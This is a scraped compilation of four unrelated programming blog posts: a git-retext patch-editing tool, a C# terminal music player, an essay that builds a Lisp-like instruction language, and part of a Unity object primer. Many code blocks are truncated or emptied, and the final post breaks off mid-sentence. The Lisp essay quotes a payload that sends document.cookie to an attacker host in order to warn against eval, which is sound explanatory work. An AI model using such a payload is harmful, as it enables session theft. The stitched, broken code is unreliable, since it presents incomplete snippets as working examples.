<p>Previous post: <a href="https://blog.aloni.org/posts/gitology-1-git-flip-history">#1</a>.</p>
<p>Today I'll introduce the commit rewriter - <code>git-retext</code>.</p>
<h2 id="familiar-ways-of-git-history-editing">Familiar ways of Git history editing</h2>
<p>In the previous post I mentioned the desire to present a clear Git history to
reviewers. Sometimes, we are reviewing our own unpublished Git history and
would like to do some polishing here and there before pushing it to a
remote repository.</p>
<p>There are multitude of ways in which editing the history can be done:</p>
<ul>
<li><code>git commit --amend</code>, with or without <code>-a</code> (in the later <code>git add</code> is used). This
takes care of the <code>HEAD</code> commit, but not commits that are earlier to it.</li>
<li><code>git rebase</code>, where you labor on a fixup commit or a set of them,
with or without <code>--interactive</code>, with or without <code>--autosquash</code>, so that
the fixup changes amend commits further down the history. There are tools such
as <a href="https://github.com/tummychow/git-absorb">git-absorb</a> that can be used to
automate creation of fixup commits.</li>
<li><code>git-filter-branch</code>, a big hammer that lets you run a command per a commit,
where the result of a command is the rewritten tree. Obviously not
quite suitable for easy 'final touches'.</li>
<li>Editor environment features. In Emacs, <a href="https://magit.vc/">Magit</a>, and in
Vim, <a href="https://github.com/jreybert/vimagit">Vimagit</a>, and possibly other editors
have their own Git integrations, some are elaborate enough to ease on editing
the history. However, to each his own, and belaboring on a certain editor
environment would get us off-topic.</li>
</ul>
<h2 id="a-new-way-git-retext">A new way - <code>git-retext</code></h2>
<p>In the process of reviewing, we are most likely looking at diffs. What if it
was possible in an environment-independent way, to just edit the diff? </p>
<p>In the pre-cursor to the invention of Git, developers used emails (and some are
still using emails) in order to pass along changes to one another. The <code>git format-patch</code> command knows how to turn a list of commits into such emails. As
plain text emails can be easily edited by a text editor, it stands to reason
that we can edit changes in-place, if we momentarily turn commits into emails
and back.</p>
<p>This is what <code>git-retext</code> essentially lets you do.</p>
<p>For example, we want to edit the most recent commit in the history. Let's issue
the command:</p>

<p>This <code>git-retext</code> command turns the <code>HEAD~1..HEAD</code> range into emails and we
immediately find ourselves thrown into editing in the default text editor that
we configured, either in Git's configuration, or <code>EDITOR</code> environment variable.
The "thrown into editor" situation should not be foreign to Git users, as it is
done in the default <code>git commit</code> or <code>git rebase -i</code> workflows.</p>
<p>Here's an example for such <code>git-retext HEAD~1</code> invocation at one of my
repositories:</p>

Subject: [PATCH] Apply random rotation for new piece

By applying a random set of rotation, the new piece is effectively
rotated to all possible rotations.

<p>This is how a commit looks like when it is sent by email. It is possible to
edit the first line of the commit in the <code>Subject: </code> ; and the details of the
commit message before the <code>---</code>, and the diff itself. About the diff, we don't
have to fix the unidiff's meta-data, because <code>git-retext</code>'s processing will
take care of it instead.</p>
<p>Saving the temporary and exiting, <code>git-retext</code> will try to apply the edited
commits using <code>git am</code>. If we have carefully edited them, they should
apply cleanly. The resultant <code>HEAD</code> is the edited history.</p>
<p>Of course, this new method is not perfect, but it's a time saver for certain
set of editing activities. After getting accustomed to it, you may start
reviewing changes in <code>git-retext</code> even if you are not ending up modifying them,
instead of running <code>git-diff</code> or viewing a diff made by the editor environment.</p>
<h2 id="advantages">Advantages</h2>
<ul>
<li>Easy to amend changes right when they are being reviewed, as long as
the editing is not too complicated. Adding new diff lines inside hunks
is possible.</li>
<li>Easy to do search and replace on the changes themselves, and that also takes
care of the commit message, and added filenames if relevant.</li>
<li>It is possible to remove unwanted diff hunks.</li>
<li>Splitting of commits to small new commits is possible by adding a new email
header in between hunks (no need to edit the diffstat).</li>
</ul>
<h2 id="disadvantages">Disadvantages</h2>
<ul>
<li>If there is more than one commit and they are dependent on one another, we
must be more careful so that the editing is consistent, and that the diff hunk
context is correct.</li>
<li>It's easy to mess up the editing and discover the mess only when <code>git-retext</code>
fails to apply the changes.</li>
</ul>
<p>Future enhancements of <code>git-retext</code> should assist in avoiding mistakes during
editing, perhaps with better editor integration.</p>

<p><code>git-retext</code> is Python 3 script that relies on <code>recountdiff</code> in order to fix
the edited diffs. The underlying git commands being used are
<code>git-format-patch</code>, <code>git-am</code>, and <code>git-reset</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" alt="MusicSharp UI Mockup" title="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" alt="MusicSharp first build screenshot" title="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>

        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" alt="Screenshot of the MusicSharp menu bar" title="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" alt="Screenshot of the MusicSharp about dialog" title="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
            <span>Thread</span><span>.</span><span>Sleep</span><span>(</span><span>1000</span><span>);</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The last order of business was to wire up the PlayAudioFile() method to the UI, and I did so by replacing the Open menu line of code in Gui.cs to the following:</p>

<div><div><pre><code><span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Player</span><span>.</span><span>PlayAudioFile</span><span>()),</span>
</code></pre></div></div>

<p>After compiling and opening the player, I was now greeted with the sweet sounds of music! Although it was exciting to hear music this early on, there were quite a few catches however. These included:</p>

<ul>
  <li>No exception handling if the MP3 file is missing</li>
  <li>No way to load other music files</li>
  <li>Missing playback controls and volume</li>
  <li>Playback status indicator</li>
</ul>

<p>Although these features were missing, I still find it quite exciting whenever I’m able to make tangible progress in a project and it provides some motivation to work through some of the more tedious parts.</p>



<p>In Part One of this guide, we learned how to implement a simple UI using Terminal.Gui and then use it to play an audio file with NAudio. I would have liked to make MusicSharp cross-platform, but unfortunately According to NAudio creator <a href="https://markjames.dev/2020-10-25-developing-a-cli-music-player-csharp/Mark%20Heath" target="_blank">Mark Heath</a>, “A large part of the [NAudio] codebase consists of P/Invoke or COM interop wrappers around the various Windows audio APIs. So even if a .NET Standard build were to be created, much of the functionality would fail to work if you tried to use it in a .NET Core app running on Linux.”.</p>

<p>Curious, I tested MusicSharp on my Macbook Pro (running Catalina) and the program ran but crashed once I tried to open an MP3:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-macOS-Catalina.png" alt="MusicSharp first build running on macOS Catalina" title="MusicSharp first build running on macOS Catalina"></p>

<p>In these early stages of testing, MusicSharp is currently consuming 15mb of memory and negligible CPU usage while running in debug mode, and it’ll be interesting to see where the performance numbers end up as the player functionality gets more fleshed out. Be sure to stay tuned for part two of this guide, as we will refactor our current code to make it easier to test and more loosely coupled using Interfaces and Dependency Injection!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>((</span><span>ins</span><span>) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>ins</span><span>.</span><span>functionName</span><span>](</span><span>...</span><span>ins</span><span>.</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>
<span>    </span><span>...</span>
<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(([</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>]) </span><span>=&gt;</span><span> </span><span>fns</span><span>[</span><span>fName</span><span>](</span><span>...</span><span>args</span><span>));</span>
<span>})</span></code></pre><p>And bam, <code>drawLine</code> would work again!</p><p>So far, we only used <code>drawLine</code>:</p><pre><code><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>// same as</span>
<span>[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]</span></code></pre><p>But what if we wanted to express something more powerful:</p><pre><code><span>rotate</span><span>(</span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>), </span><span>90</span><span>)</span></code></pre><p>Looking at that, we can translate it to an instruction like this:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]</span></code></pre><p>Here, the <code>rotate</code> instruction has an argument that is in <em>itself</em> an instruction! Pretty powerful. Surprisingly, we just need to tweak our code a tiny bit to make it work:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>

<span>      </span><span>// this must be a primitive argument, like {x: 0 y: 0}</span>
<span>      </span><span>return</span><span> </span><span>ins</span><span>;</span>

<span>  };</span>
<span>  </span><span>data</span><span>.</span><span>instructions</span><span>.forEach</span><span>(</span><span>parseInstruction</span><span>);</span>
<span>})</span></code></pre><p>Nice, We introduce a <code>parseInstruction</code> function. We can apply <code>parseInstruction</code> recursively to arguments, and support stuff like:</p><pre><code><span>[</span><span>"rotate"</span><span>, [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]]]</span></code></pre><p>Very cool!</p><p>Okay, let’s look at our JSON again:</p><pre><code><span>{</span>

<span>}</span></code></pre><p>Well, our data <em>only</em> contains instructions. Do we really need a key called <code>instructions</code>? </p><p>What if we did this: </p><pre><code><span>[</span><span>"do"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span></code></pre><p>Instead of a top-level key, we could have a special instruction called <code>do</code>, which runs all the instructions it’s given.</p><p>Here’s one way we can implement it:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>

<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>);</span>
<span>})</span></code></pre><p>Oh wow, that was easy. We just added <code>do</code> in <code>fns</code>. Now we can support an instruction like this:</p><pre><code><span>[</span>
<span>  </span><span>"do"</span><span>,</span>
<span>  [</span><span>"drawPoint"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }],</span>
<span>  [</span><span>"rotate"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }], </span><span>90</span><span>]],</span>
<span>];</span></code></pre><p>Let’s make it more interesting. What if we wanted to support <em>definitions?</em></p><pre><code><span>const</span><span> </span><span>shape</span><span> </span><span>=</span><span> </span><span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span></code></pre><p>If we could support definitions, our remote user could write some very expressive instructions! Let’s convert our code to the kind of data structure we’ve been playing with:</p><pre><code><span>[</span><span>"def"</span><span>, </span><span>"shape"</span><span>, [</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }]]</span>
<span>[</span><span>"rotate"</span><span>, </span><span>"shape"</span><span>, </span><span>90</span><span>]</span></code></pre><p>Noot bad! If we can support an instruction like that, we’d be golden! Here’s how: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>

<span>];</span></code></pre><p>Not bad!</p><p>Let’s step it up a notch. What if we let our remote user <em>define their own functions?</em> </p><p>Say they wanted to write something like this:</p><pre><code><span>const</span><span> </span><span>drawTriangle</span><span> </span><span>=</span><span> </span><span>function</span><span>(</span><span>left</span><span>, </span><span>top</span><span>, </span><span>right</span><span>, </span><span>color</span><span>) { </span>

<span>} </span>
<span>drawTriangle</span><span>(</span><span>...</span><span>)</span></code></pre><p>How would we do it? Let’s follow our intuition again. If we transcribe this to our data representation, here’s how it could look:</p><pre><code><span>  [</span><span>"def"</span><span>, </span><span>"drawTriangle"</span><span>,</span>

What if we did this:</p><pre><code><span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>  </span><span>return</span><span> (</span><span>...</span><span>values</span><span>) </span><span>=&gt;</span><span> {</span>

<span>    </span><span>return</span><span> </span><span>parseInstruction</span><span>(</span><span>body</span><span>, </span><span>newVariables</span><span>);</span>
<span>  };</span>
<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>
<span>  left: { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, </span>
<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>"blue"</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>"do"</span><span>,</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>
<span>    </span><span>...</span>
<span>    </span><span>const</span><span> [</span><span>fName</span><span>, </span><span>...</span><span>args</span><span>] </span><span>=</span><span> </span><span>ins</span><span>;</span>

<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Now, our <code>parseFnInstruction</code>: </p><pre><code><span>const</span><span> </span><span>mapArgsWithValues</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>values</span><span>) </span><span>=&gt;</span><span> { </span>

<span>    </span><span>res</span><span>[</span><span>k</span><span>] </span><span>=</span><span> </span><span>values</span><span>[</span><span>idx</span><span>];</span>
<span>    </span><span>return</span><span> </span><span>res</span><span>;</span>
<span>  }, {});</span>
<span>}</span>
<span>const</span><span> </span><span>parseFnInstruction</span><span> </span><span>=</span><span> (</span><span>args</span><span>, </span><span>body</span><span>, </span><span>oldVariables</span><span>) </span><span>=&gt;</span><span> {</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We already discussed
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#gameobject">Game Objects</a> and
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#component">Components</a> as two
of the fundamental building blocks of the Unity Engine. Today, we’ll discuss
their programmatic representation.</p><p><em>This is <strong><a href="https://blog.eyas.sh/tag/unity-for-software-engineers">Unity for Software Engineers</a></strong>,
a series for folks familiar with software development best practices seeking an
accelerated introduction to Unity as an engine and editor. More is coming over
the next few weeks, so <a href="http://eepurl.com/gVgusL">consider subscribing</a> for
updates.</em></p><p>The Unity Engine <em>runtime</em> is primarily written in C++, and much of the Engine’s
primitives (such as the game objects and their components) live in C++ land.
You’ll also know that the Unity Engine <em>API</em> is in C#. The API gives you access
to all of Unity’s native objects in a way that<!-- -->—<!-- -->save for a few pitfalls
we’ll discuss today<!-- -->—<!-- -->feels like intuitive, idiomatic C#.</p><figure><p><img src="https://blog.eyas.sh/e1e4978ec3c78301c0c6b929c61f8bf7/object-hierarchy.svg" alt="A GameObject, MonoBehaviour, and ScriptableObject all inherit from UnityEngine Object."></p><figcaption><p>The <em>C#</em> class hierarchy of <code>UnityEngine.Object</code>, <code>GameObject</code>,
<code>ScriptableObject</code>, <code>Component</code>, and their children. This should map to the
<em>conceptual</em> hierarchy of how to think about these objects, though sometimes the
runtime implementation will look different.</p></figcaption></figure><h2 id="unityobject">UnityEngine.Object</h2><p>At the top of the Unity Object hierarchy sits <strong><code>UnityEngine.Object</code></strong>. For the
most part provides a <code>name</code> string, an <code>int GetInstanceID()</code> method, and a bunch
of equality comparers.</p><p>The class also provides a <code>static void Destroy(Object obj)</code> method (and some
overloads) that destroys a <code>UnityEngine.Object</code> and any of its subclasses. When
an Object is destroyed, the <em>native</em> part of the object is freed from memory,
and the smaller <em>managed</em> part will be garbage collected <em>at some point</em> after
